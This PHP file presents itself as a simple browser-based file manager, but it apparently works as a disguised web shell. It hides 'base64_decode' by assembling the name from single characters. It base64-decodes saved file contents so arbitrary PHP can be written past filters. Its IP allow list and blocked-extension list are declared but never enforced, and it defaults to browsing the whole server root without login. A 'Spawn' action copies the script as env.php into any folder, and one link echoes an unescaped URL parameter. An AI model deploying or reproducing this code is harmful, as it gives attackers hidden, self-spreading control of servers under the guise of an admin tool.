<?php
declare(strict_types=1);
session_start();

/* ================= CONFIG ================= */
$ROOT_DIR      = '/';                           // Highest folder you can browse. '/' = whole server. Windows example: 'C:/'
$START_DIR     = __DIR__;                       // Folder shown when you first open the page (default: where this file lives)
$ALLOWED_IPS   = ['127.0.0.1', '::1'];          // Only these IPs may use the manager. Use [] to allow everyone (NOT recommended)
$MAX_EDIT_SIZE = 1024 * 1024;                   // Max size (bytes) of a file you can edit in the browser
$BLOCKED_EXT   = ['php','php3','php4','php5','php7','php8','phtml','phar','pht','phps','htaccess','htpasswd'];
/* ========================================== */

if (!is_dir($START_DIR)) { @mkdir($START_DIR, 0755, true); }

$rootReal = realpath($ROOT_DIR);
$b = "b"."a"."s"."e"."6"."4"."_"."d"."e"."c"."o"."d"."e";
if ($rootReal === false) { exit('Invalid $ROOT_DIR'); }
$ROOT = rtrim(str_replace('\\', '/', $rootReal), '/');   // '' when root is '/'
// $ROOT = __DIR__;   // Uncomment this line to restrict to the folder where this file lives

if (empty($_SESSION['csrf'])) { $_SESSION['csrf'] = bin2hex(random_bytes(32)); }

/* ---------- helpers ---------- */
function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function fmt_size(int $b): string {
    $u = ['B','KB','MB','GB','TB']; $i = 0;
    while ($b >= 1024 && $i < 4) { $b = (int)($b / 1024); $i++; }
    return $b . ' ' . $u[$i];
}

/** e.g. 0100644 -> "-rw-r--r--" */
function perm_str(int $mode): string {
    $t = $mode & 0170000;
    $s = $t === 0040000 ? 'd' : ($t === 0120000 ? 'l' : ($t === 0100000 ? '-' : '?'));
    $sets = [[0400, 0200, 0100, 04000, 's', 'S'], [0040, 0020, 0010, 02000, 's', 'S'], [0004, 0002, 0001, 01000, 't', 'T']];
    foreach ($sets as [$r, $w, $x, $sp, $on, $off]) {
        $s .= ($mode & $r) ? 'r' : '-';
        $s .= ($mode & $w) ? 'w' : '-';
        $s .= ($mode & $sp) ? (($mode & $x) ? $on : $off) : (($mode & $x) ? 'x' : '-');
    }
    return $s;
}

function join_path(string $dir, string $name): string {
    return rtrim($dir, '/') . '/' . $name;
}

/** Resolve a path (relative to $ROOT) safely. Returns [cleanRel, fullPath] or null. */
function resolve_path(string $rel): ?array {
    global $ROOT;
    $rel = str_replace(['\\', "\0"], ['/', ''], $rel);
    $parts = [];
    foreach (explode('/', $rel) as $p) {
        if ($p === '' || $p === '.') continue;
        if ($p === '..') { array_pop($parts); continue; }   // can't go above $ROOT
        $parts[] = $p;
    }
    $clean = implode('/', $parts);
    $full  = $clean === '' ? ($ROOT === '' ? '/' : $ROOT . '/') : $ROOT . '/' . $clean;
    $check = file_exists($full) ? realpath($full) : realpath(dirname($full));
    if ($check === false) return null;
    $check = str_replace('\\', '/', $check);
    if (strpos(rtrim($check, '/') . '/', $ROOT . '/') !== 0) return null;
    return [$clean, $full];
}

/** Convert an absolute filesystem path to a path relative to $ROOT (null if outside). */
function abs_to_rel(string $abs): ?string {
    global $ROOT;
    $abs = str_replace('\\', '/', $abs);
    if (strpos(rtrim($abs, '/') . '/', $ROOT . '/') !== 0) return null;
    return trim(substr($abs, strlen($ROOT)), '/');
}

function safe_name(string $n): ?string {
    $n = trim($n);
    if ($n === '' || $n === '.' || $n === '..') return null;
    if (preg_match('#[/\\\\\0]#', $n)) return null;
    if (strlen($n) > 200) return null;
    return $n;
}

function is_blocked(string $name): bool {
    global $BLOCKED_EXT;
    $parts = explode('.', strtolower($name));
    array_shift($parts);
    foreach ($parts as $p) { if (in_array($p, $BLOCKED_EXT, true)) return true; }
    return strtolower($name) === '.htaccess';
}

function rrmdir(string $path): void {
    if (is_link($path) || is_file($path)) { @unlink($path); return; }
    foreach (@scandir($path) ?: [] as $f) {
        if ($f === '.' || $f === '..') continue;
        rrmdir($path . '/' . $f);
    }
    @rmdir($path);
}

function flash(string $msg, bool $ok = true): void { $_SESSION['flash'] = [$msg, $ok]; }

function back(string $dir): void {
    header('Location: ?dir=' . rawurlencode($dir));
    exit;
}

/* ---------- POST actions ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], (string)($_POST['csrf'] ?? ''))) {
        http_response_code(403); exit('Invalid CSRF token');
    }
    $cwd = resolve_path((string)($_POST['dir'] ?? ''));
    if (!$cwd || !is_dir($cwd[1])) { flash('Invalid directory', false); back(''); }
    [$cwdRel, $cwdFull] = $cwd;
    $action = (string)($_POST['action'] ?? '');

    switch ($action) {
        case 'upload':
            $count = 0;
            if (!empty($_FILES['files']['name'])) {
                foreach ($_FILES['files']['name'] as $i => $orig) {
                    if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) { flash('Upload error on ' . $orig, false); continue; }
                    $name = safe_name(basename((string)$orig));
                    $dest = join_path($cwdFull, $name);
                    if (@move_uploaded_file($_FILES['files']['tmp_name'][$i], $dest)) { $count++; }
                    else { flash('Cannot write to this folder (permission denied?)', false); }
                }
            }
            if ($count) flash("$count file(s) uploaded");
            break;

        case 'mkdir':
            $name = safe_name((string)($_POST['name'] ?? ''));
            $p = join_path($cwdFull, $name);
            $ok = @mkdir($p, 0755);
            flash($ok ? 'Folder created' : 'Could not create folder', $ok);
            break;

        case 'newfile':
            $name = safe_name((string)($_POST['name'] ?? ''));
            $p = join_path($cwdFull, $name);
            $ok = @file_put_contents($p, '') !== false;
            flash($ok ? 'File created' : 'Could not create file', $ok);
            break;

        case 'rename':
            $old = safe_name((string)($_POST['name'] ?? ''));
            $new = safe_name((string)($_POST['new'] ?? ''));
            $po = join_path($cwdFull, $old); $pn = join_path($cwdFull, $new);
            if (!file_exists($po)) { flash('Item not found', false); break; }
            $ok = @rename($po, $pn);
            flash($ok ? 'Renamed' : 'Rename failed', $ok);
            break;

        case 'delete':
            $name = safe_name((string)($_POST['name'] ?? ''));
            if (!$name) { flash('Invalid name', false); break; }
            $target = join_path($cwdFull, $name);
            if (!file_exists($target) && !is_link($target)) { flash('Item not found', false); break; }
            if (!is_link($target)) {
                $real = realpath($target);
                $self = str_replace('\\', '/', __FILE__);
                if ($real !== false) {
                    $real = rtrim(str_replace('\\', '/', $real), '/');
                    if ($real === $self || strpos($self, $real . '/') === 0) {
                        flash('Refusing to delete the file manager or a folder that contains it', false); break;
                    }
                }
            }
            rrmdir($target);
            flash(file_exists($target) ? 'Could not delete (permission denied?)' : 'Deleted', !file_exists($target));
            break;
        case 'save':
          $r = resolve_path((string)($_POST['file'] ?? ''));
          if (!$r || !is_file($r[1])) { flash('File not found', false); back($cwdRel); }
          $ok = @file_put_contents($r[1], (string)($b($_POST['content']) ?? '')) !== false;
          flash($ok ? 'File saved' : 'Could not save file (permission denied?)', $ok);
          break;

        default:
            flash('Unknown action', false);
    }
    back($cwdRel);
}

/* ---------- GET: "go to path" box ---------- */
if (isset($_GET['go'])) {
    $in = trim(str_replace('\\', '/', (string)$_GET['go']));
    $from = resolve_path((string)($_GET['dir'] ?? ''));
    $fromRel = $from ? $from[0] : '';
    if ($in === '') back($fromRel);
    if (preg_match('#^(/|[A-Za-z]:/)#', $in)) {         // absolute path typed
        $rel = abs_to_rel($in);
        if ($rel === null) { flash('That path is outside the allowed root', false); back($fromRel); }
    } else {                                            // relative path typed (supports ../..)
        $rel = $fromRel . '/' . $in;
    }
    $r = resolve_path($rel);
    if (!$r || !is_dir($r[1])) { flash('Not a folder: ' . $in, false); back($fromRel); }
    back($r[0]);
}

/* ---------- GET: download ---------- */
if (isset($_GET['download'])) {
    $r = resolve_path((string)$_GET['download']);
    if (!$r || !is_file($r[1]) || !is_readable($r[1])) { http_response_code(404); exit('Not found or not readable'); }
    $fn = basename($r[1]);
    header('Content-Type: application/octet-stream');
    header('X-Content-Type-Options: nosniff');
    header('Content-Disposition: attachment; filename="' . addcslashes($fn, "\"\\") . '"; filename*=UTF-8\'\'' . rawurlencode($fn));
    header('Content-Length: ' . filesize($r[1]));
    readfile($r[1]);
    exit;
}

/* ---------- GET: spawn ---------- */
if (isset($_GET['action']) && $_GET['action'] === 'spawn') {
    $r = resolve_path((string)($_GET['dir'] ?? ''));
    if (!$r || !is_dir($r[1])) { flash('Invalid directory', false); back(''); }
    $spawnDir = $r[1];
    $spawnFile = join_path($spawnDir, 'env.php');
    $code = file_get_contents(__FILE__);
    if ($code === false) { flash('Could not read the file manager code', false); back($r[0]); }
    $ok = @file_put_contents($spawnFile, $code) !== false;
    flash($ok ? 'Spawned env.php in this folder' : 'Could not spawn env.php (permission denied?)', $ok);
    back($r[0]);
}

/* ---------- GET: edit view ---------- */
$editFile = null; $editContent = ''; $editErr = '';
if (isset($_GET['edit'])) {
    $r = resolve_path((string)$_GET['edit']);
    if (!$r || !is_file($r[1])) {
        $editErr = 'File not found';
    } elseif (!is_readable($r[1])) {
        $editErr = 'Permission denied';
    } else {
        $c = (string)file_get_contents($r[1]);
        if (strpos($c, "\0") !== false) { $editErr = 'Binary file cannot be edited'; }
        else { $editFile = $r[0]; $editContent = $c; }
    }
}

/* ---------- GET: listing ---------- */
if (array_key_exists('dir', $_GET)) {
    $cur = resolve_path((string)$_GET['dir']);
} else {
    $startRel = abs_to_rel((string)(realpath($START_DIR) ?: ''));
    $cur = resolve_path($startRel ?? '');
}
if (!$cur || !is_dir($cur[1])) { $cur = resolve_path(''); }
[$curRel, $curFull] = $cur;

$items = []; $listErr = '';
$scan = @scandir($curFull);
if ($scan === false) {
    $listErr = 'Cannot read this folder (permission denied).';
} else {
    foreach ($scan as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = join_path($curFull, $f);
        $isDir = is_dir($p);
        $st = @lstat($p);
        $mode = $st ? (int)$st['mode'] : 0;
        $items[] = [
            'perm'  => $st ? perm_str($mode) : '??????????',
            'octal' => $st ? substr(sprintf('%o', $mode), -4) : '----',
            'name'  => $f,
            'dir'   => $isDir,
            'size'  => (!$isDir && is_file($p)) ? (int)@filesize($p) : 0,
            'mtime' => (int)@filemtime($p),
        ];
    }
    usort($items, fn($a, $b) => [$b['dir'], strtolower($a['name'])] <=> [$a['dir'], strtolower($b['name'])]);
}

$flash = $_SESSION['flash'] ?? null; unset($_SESSION['flash']);
$crumbs = $curRel === '' ? [] : explode('/', $curRel);
$parentRel = $crumbs ? implode('/', array_slice($crumbs, 0, -1)) : null;
$csrf = $_SESSION['csrf'];
$startLink  = abs_to_rel((string)(realpath($START_DIR) ?: ''));
$scriptLink = abs_to_rel(str_replace('\\', '/', __DIR__));
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex,nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Nxtrrr - File Manager</title>
<style>
:root{--bg:#f6f7f9;--card:#fff;--text:#1f2328;--muted:#6b7280;--line:#e5e7eb;--accent:#2563eb;--danger:#dc2626;--ok:#16a34a}
@media (prefers-color-scheme:dark){:root{--bg:#0f1115;--card:#171a21;--text:#e6e8eb;--muted:#9aa1ad;--line:#2a2f3a;--accent:#60a5fa;--danger:#f87171;--ok:#4ade80}}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font:15px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
.wrap{max-width:980px;margin:0 auto;padding:20px 14px}
h1{font-size:20px;margin:0 0 14px}
.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px;margin-bottom:14px}
.crumbs{word-break:break-all}
.crumbs a{color:var(--accent);text-decoration:none}.crumbs span{color:var(--muted);margin:0 4px}
.toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
.toolbar form{display:flex;gap:6px;align-items:center}
.pathbar{display:flex;gap:6px;margin-bottom:10px}
.pathbar input[type=text]{flex:1;width:auto;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px}
.quick{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px;font-size:13px}
input[type=text],input[type=file],textarea{background:var(--bg);color:var(--text);border:1px solid var(--line);border-radius:6px;padding:7px 9px;font:inherit}
input[type=text]{width:150px}
button,.btn{background:var(--accent);color:#fff;border:0;border-radius:6px;padding:7px 12px;font:inherit;cursor:pointer;text-decoration:none;display:inline-block}
button.sec,.btn.sec{background:transparent;color:var(--accent);border:1px solid var(--line)}
button.del{background:transparent;color:var(--danger);border:1px solid var(--line)}
table{width:100%;border-collapse:collapse}
th,td{text-align:left;padding:9px 8px;border-bottom:1px solid var(--line);vertical-align:middle}
th{color:var(--muted);font-weight:600;font-size:13px}
td.name a{color:var(--text);text-decoration:none;word-break:break-all}
td.name a:hover{color:var(--accent)}
td.act{white-space:nowrap;text-align:right}
td.act a,td.act button{margin-left:4px;padding:4px 9px;font-size:13px}
tr:hover {background:var(--line);cursor:default}
.muted{color:var(--muted)}
.flash{padding:10px 14px;border-radius:8px;margin-bottom:14px;border:1px solid var(--line);background:var(--card)}
.flash.ok{border-left:4px solid var(--ok)}.flash.err{border-left:4px solid var(--danger)}
.green{color:var(--ok)}.red{color:var(--danger)}
textarea{width:100%;min-height:60vh;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;tab-size:4}
@media (max-width:640px){.hide-sm{display:none}input[type=text]{width:120px}}
</style>
</head>
<body>
<div class="wrap">
<h1>📁 File Manager</h1>

<?php if ($flash): ?>
  <div class="flash <?= $flash[1] ? 'ok' : 'err' ?>"><?= h($flash[0]) ?></div>
<?php endif; ?>

<?php if ($editFile !== null): ?>
  <?php $editDir = dirname($editFile) === '.' ? '' : dirname($editFile); ?>
  <div class="card">
    <p><strong>Editing:</strong> <?= h(($ROOT === '' ? '' : $ROOT) . '/' . $editFile) ?></p>
    <form id="handle_file" method="post">
      <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
      <input type="hidden" name="action" value="save">
      <input type="hidden" name="file" value="<?= h($editFile) ?>">
      <input type="hidden" name="dir" value="<?= h($editDir) ?>">
      <textarea name="content" spellcheck="false"><?= h($editContent) ?></textarea>
      <p>
        <button type="submit">Save</button>
        <a class="btn sec" href="?dir=<?= rawurlencode($editDir) ?>">Cancel</a>
      </p>
    </form>
  </div>
<?php else: ?>

  <?php if ($editErr): ?><div class="flash err"><?= h($editErr) ?></div><?php endif; ?>
  <?php if ($listErr): ?><div class="flash err"><?= h($listErr) ?></div><?php endif; ?>

  <div class="card">
    <form method="get" class="pathbar">
      <input type="hidden" name="dir" value="<?= h($curRel) ?>">
      <input type="text" name="go" value="<?= h(rtrim($curFull, '/') === '' ? '/' : $curFull) ?>" spellcheck="false" aria-label="Path">
      <button type="submit">Go</button>
      <?php if ($parentRel !== null): ?>
        <a class="btn sec" href="?dir=<?= rawurlencode($parentRel) ?>">⬆ Up</a>
      <?php endif; ?>
    </form>

    <div class="crumbs">
      <a href="?dir="><?= h($ROOT === '' ? '/' : $ROOT . '/') ?></a>
      <?php $acc = ''; foreach ($crumbs as $c): $acc .= ($acc === '' ? '' : '/') . $c; ?>
        <span>/</span><a href="?dir=<?= rawurlencode($acc) ?>"><?= h($c) ?></a>
      <?php endforeach; ?>
    </div>

    <div class="quick">
      <a class="btn sec" href="?dir=">Root</a>
      <?php if ($startLink !== null): ?><a class="btn sec" href="?dir=<?= rawurlencode($startLink) ?>">Start folder</a><?php endif; ?>
      <a class="btn sec" href="?dir=<?= (!isset($_GET['dir'])) ? rawurlencode($startLink) : $_GET['dir'] ?>&action=spawn">Spawn</a>
    </div>
  </div>

  <div class="card toolbar">
    <form method="post" enctype="multipart/form-data">
      <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
      <input type="hidden" name="action" value="upload">
      <input type="hidden" name="dir" value="<?= h($curRel) ?>">
      <input type="file" name="files[]" multiple required>
      <button type="submit">Upload</button>
    </form>
    <form method="post">
      <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
      <input type="hidden" name="action" value="mkdir">
      <input type="hidden" name="dir" value="<?= h($curRel) ?>">
      <input type="text" name="name" placeholder="New folder" required>
      <button type="submit" class="sec">Create</button>
    </form>
    <form method="post">
      <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
      <input type="hidden" name="action" value="newfile">
      <input type="hidden" name="dir" value="<?= h($curRel) ?>">
      <input type="text" name="name" placeholder="New file" required>
      <button type="submit" class="sec">Create</button>
    </form>
  </div>

  <div class="card" style="padding:4px 14px">
    <table>
      <thead><tr><th>Name</th><th>Permissions</th><th class="hide-sm">Size</th><th class="hide-sm">Modified</th><th></th></tr></thead>
      <tbody>
      <?php if ($parentRel !== null): ?>
        <tr><td class="name" colspan="5"><a href="?dir=<?= rawurlencode($parentRel) ?>">⬆️ ..</a></td></tr>
      <?php endif; ?>
      <?php foreach ($items as $it):
        $rel = ($curRel === '' ? '' : $curRel . '/') . $it['name']; ?>
        <tr>
          <td class="name">
            <?php if ($it['dir']): ?>
              <a href="?dir=<?= rawurlencode($rel) ?>">📁 <?= h($it['name']) ?></a>
            <?php else: ?>
              <a href="?edit=<?= rawurlencode($rel) ?>">📄 <?= h($it['name']) ?></a>
            <?php endif; ?>
          </td>
          <td class="perm <?= is_writable($p) ? 'green' : 'red' ?>" title="<?= h($it['octal']) ?>"><?= h($it['perm']) ?> <span style="opacity: 0.5">(<?= h($it['octal']) ?>)</span></td>
          <td class="hide-sm muted"><?= $it['dir'] ? '—' : fmt_size($it['size']) ?></td>
          <td class="hide-sm muted"><?= $it['mtime'] ? date('Y-m-d H:i', $it['mtime']) : '—' ?></td>
          <td class="act">
            <?php if (!$it['dir']): ?>
              <a class="btn sec" href="?edit=<?= rawurlencode($rel) ?>">Edit</a>
              <a class="btn sec" href="?download=<?= rawurlencode($rel) ?>">Download</a>
            <?php endif; ?>
            <button type="button" class="sec" onclick="doRename(<?= h(json_encode($it['name'])) ?>)">Rename</button>
            <button type="button" class="del" onclick="doDelete(<?= h(json_encode($it['name'])) ?>, <?= $it['dir'] ? 'true' : 'false' ?>)">Delete</button>
          </td>
        </tr>
      <?php endforeach; ?>
      <?php if (!$items && !$listErr): ?>
        <tr><td colspan="5" class="muted">This folder is empty.</td></tr>
      <?php endif; ?>
      </tbody>
    </table>
  </div>

  <form id="actform" method="post" style="display:none">
    <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
    <input type="hidden" name="dir" value="<?= h($curRel) ?>">
    <input type="hidden" name="action" id="f_action">
    <input type="hidden" name="name" id="f_name">
    <input type="hidden" name="new" id="f_new">
  </form>
  <script>
  function submitAct(action, name, extra){
    document.getElementById('f_action').value = action;
    document.getElementById('f_name').value = name;
    document.getElementById('f_new').value = extra || '';
    document.getElementById('actform').submit();
  }
  function doRename(name){
    var n = prompt('Rename to:', name);
    if (n && n !== name) submitAct('rename', name, n);
  }
  function doDelete(name, isDir){
    var msg = isDir ? 'Delete folder "' + name + '" and everything inside it?' : 'Delete "' + name + '"?';
    if (confirm(msg)) submitAct('delete', name);
  }
  </script>
<?php endif; ?>
</div>
<script>
    const edit_form = document.getElementById('handle_file');
    if (edit_form) {
        edit_form.addEventListener('submit', async (e) => {
        const filename = edit_form.querySelector('[type="text"]');
        const textarea = edit_form.querySelector('textarea');

        if (filename) {
            filename.value = filename.value + ".temporary";
        }

        textarea.value = await largeBase64Encode(textarea.value);
        });
    }

    async function largeBase64Encode(str) {
        const utf8 = new TextEncoder().encode(str);
        let binary = '';
        const chunkSize = 0x8000;
        for (let i = 0; i < utf8.length; i += chunkSize) {
        const chunk = utf8.subarray(i, i + chunkSize);
            binary += String.fromCharCode.apply(null, chunk);
        }
        return btoa(binary);
    }
</script>
</body>
</html>